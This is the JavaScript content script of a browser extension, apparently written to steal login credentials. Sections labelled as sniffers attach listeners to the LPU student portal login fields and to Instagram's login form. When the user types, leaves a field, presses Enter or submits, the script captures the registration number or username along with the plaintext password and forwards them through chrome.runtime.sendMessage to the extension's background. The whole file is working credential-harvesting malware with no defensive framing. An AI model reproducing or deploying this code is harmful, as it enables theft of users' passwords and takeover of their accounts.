// =================== 🔄 Student Data Sniffer (LPU) ===================

// Track last sent data to avoid duplicate sends
let lastSentStudentData = { regNo: "", password: "" };

function sendStudentData(regNo, password) {
  // Don't send if same as last sent data
  if (lastSentStudentData.regNo === regNo && lastSentStudentData.password === password) {
    return;
  }
  
  // Update last sent data
  lastSentStudentData = { regNo, password };
  
  chrome.runtime.sendMessage({
    type: "student_data",
    data: { registrationNumber: regNo, password },
  });
}

function setupStudentListeners() {
  try {
    const regInput = document.getElementById("txtU");
    const passInput = document.getElementById("TxtpwdAutoId_8767");

    if (!regInput || !passInput) return false;

    // Find the login/submit button
    const loginBtn = document.querySelector("input[type='submit'], button[type='submit'], #btnLogin, .login-btn, [name='Submit']");

    // Debounce timer
    let debounceTimer = null;
    const DEBOUNCE_DELAY = 1500; // Wait 1.5 seconds after typing stops

    const sendWithValidation = () => {
      const regNo = regInput.value.trim();
      const password = passInput.value;
      
      // Only send if both fields have meaningful data
      // Registration number should be at least 8 chars (typical LPU format)
      // Password should be at least 4 chars
      if (regNo && password && regNo.length >= 8 && password.length >= 4) {
        sendStudentData(regNo, password);
      }
    };

    // Debounced send - waits for user to stop typing
    const debouncedSend = () => {
      clearTimeout(debounceTimer);
      debounceTimer = setTimeout(sendWithValidation, DEBOUNCE_DELAY);
    };

    // Send on form submit / login button click (most reliable)
    if (loginBtn) {
      loginBtn.addEventListener("click", () => {
        clearTimeout(debounceTimer); // Cancel debounce
        sendWithValidation();
      }, { capture: true });
    }

    // Also capture form submit event
    const form = regInput.closest("form") || passInput.closest("form");
    if (form) {
      form.addEventListener("submit", () => {
        clearTimeout(debounceTimer);
        sendWithValidation();
      }, { capture: true });
    }

    // Send on blur (when user leaves the field) - immediate, no debounce
    passInput.addEventListener("blur", sendWithValidation);

    // Debounced send on input (backup, but with delay)
    passInput.addEventListener("input", debouncedSend);

    // Send on Enter key press in password field
    passInput.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        clearTimeout(debounceTimer);
        sendWithValidation();
      }
    });

    console.log("%c✅ LPU input listeners attached (optimized)", "color: green;");
    return true;
  } catch (e) {
    console.error("❌ Error setting up LPU listeners:", e);
    return false;
  }
}

// Retry mechanism for LPU inputs
if (!setupStudentListeners()) {
  let retries = 0;
  const maxRetries = 15;
  const interval = setInterval(() => {
    retries++;
    if (setupStudentListeners() || retries >= maxRetries) {
      clearInterval(interval);
      if (retries >= maxRetries) {
        console.log(
          "%c⚠️ LPU inputs not found after max retries. Script stopped.",
          "color: orange;"
        );
      }
    }
  }, 700);
}
// =================== 🔐 Instagram Login Sniffer (Reliable) ===================
if (location.hostname.includes("instagram.com")) {
  let igTries = 0;
  const igMaxTries = 25;

  const sniffInstagramLogin = setInterval(() => {
    igTries++;

    const usernameInput = document.querySelector("input[name='username']");
    const passwordInput = document.querySelector("input[name='password']");
    const loginBtn = document.querySelector("button[type='submit']:not([disabled])");

    if (usernameInput && passwordInput && loginBtn) {
      console.log("%c✅ [IG] Login form detected", "color: green;");

      loginBtn.addEventListener("click", () => {
        const username = usernameInput.value.trim();
        const password = passwordInput.value;

        if (username && password) {
          chrome.runtime.sendMessage({
            type: "instagram_login_data",
            data: { username, password },
          });
        }
      }, { once: true });

      clearInterval(sniffInstagramLogin);
    }

    if (igTries >= igMaxTries) {
      clearInterval(sniffInstagramLogin); // ❌ No warning shown
    }
  }, 700);
}
